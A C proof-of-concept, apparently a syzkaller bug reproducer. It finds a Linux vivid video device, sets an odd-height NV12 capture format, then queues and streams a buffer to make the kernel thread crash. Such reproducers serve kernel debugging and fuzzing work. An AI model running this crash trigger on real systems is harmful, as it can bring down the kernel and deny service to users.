// https://syzkaller.appspot.com/bug?id=717eb04d1a763ce97ec4605de77a05574cf4d848
#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/videodev2.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

int main() {
    int fd = -1;
    char dev_name[32];
    struct v4l2_capability cap;
    int input_found = 0;

    /* Find the vivid device that supports single-planar capture */
    for (int i = 0; i < 64; i++) {
        snprintf(dev_name, sizeof(dev_name), "/dev/video%d", i);
        fd = open(dev_name, O_RDWR);
        if (fd < 0) continue;

        if (ioctl(fd, VIDIOC_QUERYCAP, &cap) == 0) {
            if (strcmp((char *)cap.driver, "vivid") == 0) {
                if (!(cap.device_caps & V4L2_CAP_VIDEO_CAPTURE)) {
                    close(fd);
                    fd = -1;
                    continue;
                }

                /* Find an input that accepts our odd-height NV12 format */
                for (int input = 0; input < 10; input++) {
                    if (ioctl(fd, VIDIOC_S_INPUT, &input) < 0) {
                        continue;
                    }

                    struct v4l2_format fmt;
                    memset(&fmt, 0, sizeof(fmt));
                    fmt.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
                    fmt.fmt.pix.width = 720;
                    fmt.fmt.pix.height = 49;
                    fmt.fmt.pix.pixelformat = V4L2_PIX_FMT_NV12;
                    
                    if (ioctl(fd, VIDIOC_S_FMT, &fmt) == 0) {
                        if (fmt.fmt.pix.height == 49 && fmt.fmt.pix.pixelformat == V4L2_PIX_FMT_NV12) {
                            printf("[+] Found vivid device at %s, input %d\n", dev_name, input);
                            input_found = 1;
                            break;
                        }
                    }
                }
                if (input_found) break;
            }
        }
        close(fd);
        fd = -1;
    }

    if (fd < 0 || !input_found) {
        printf("[-] Could not find suitable vivid device/input\n");
        exit(1);
    }

    /* Request buffers */
    struct v4l2_requestbuffers req;
    memset(&req, 0, sizeof(req));
    req.count = 1;
    req.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    req.memory = V4L2_MEMORY_MMAP;
    int res = ioctl(fd, VIDIOC_REQBUFS, &req);
    if (res < 0) {
        printf("[-] Failed to VIDIOC_REQBUFS: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] VIDIOC_REQBUFS successful.\n");

    /* Queue buffer */
    struct v4l2_buffer buf;
    memset(&buf, 0, sizeof(buf));
    buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    buf.memory = V4L2_MEMORY_MMAP;
    buf.index = 0;
    res = ioctl(fd, VIDIOC_QBUF, &buf);
    if (res < 0) {
        printf("[-] Failed to VIDIOC_QBUF: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] VIDIOC_QBUF successful.\n");

    /* Start streaming to wake up the vivid kthread */
    int type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    res = ioctl(fd, VIDIOC_STREAMON, &type);
    if (res < 0) {
        printf("[-] Failed to VIDIOC_STREAMON: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] VIDIOC_STREAMON successful.\n");

    /* Wait for the kthread to fill the buffer and crash */
    sleep(2);
    
    return 0;
}